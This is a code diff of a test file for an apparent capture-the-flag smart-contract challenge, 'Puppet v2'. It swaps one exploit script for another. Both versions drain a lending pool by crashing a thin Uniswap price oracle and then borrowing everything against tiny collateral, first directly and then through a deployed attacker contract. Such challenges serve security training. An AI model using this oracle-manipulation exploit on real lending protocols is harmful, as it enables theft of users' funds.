@@ -82,14 +82,22 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
+        
         // There is not much liquidity on Uniswap
         // We can sell all our tokens on Uniswap to manipulate the price
         // Then we can borrow all the tokens from the lending pool with a small collateral
-        await weth.connect(player).deposit({value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n});
-        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await uniswapRouter.connect(player).swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], player.address, Date.now()+60);
-        await weth.connect(player).approve(lendingPool.address, await weth.balanceOf(player.address));
-        await lendingPool.connect(player).borrow(1000000n * 10n ** 18n);
+
+        attacker = await (await ethers.getContractFactory('PuppetV2Attacker', player)).deploy(
+            lendingPool.address, 
+            uniswapRouter.address,
+            token.address,
+            weth.address
+        );
+
+        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        await attacker.attack({value: PLAYER_INITIAL_ETH_BALANCE - 5n * 10n ** 16n});
+
     });
 
     after(async function () {
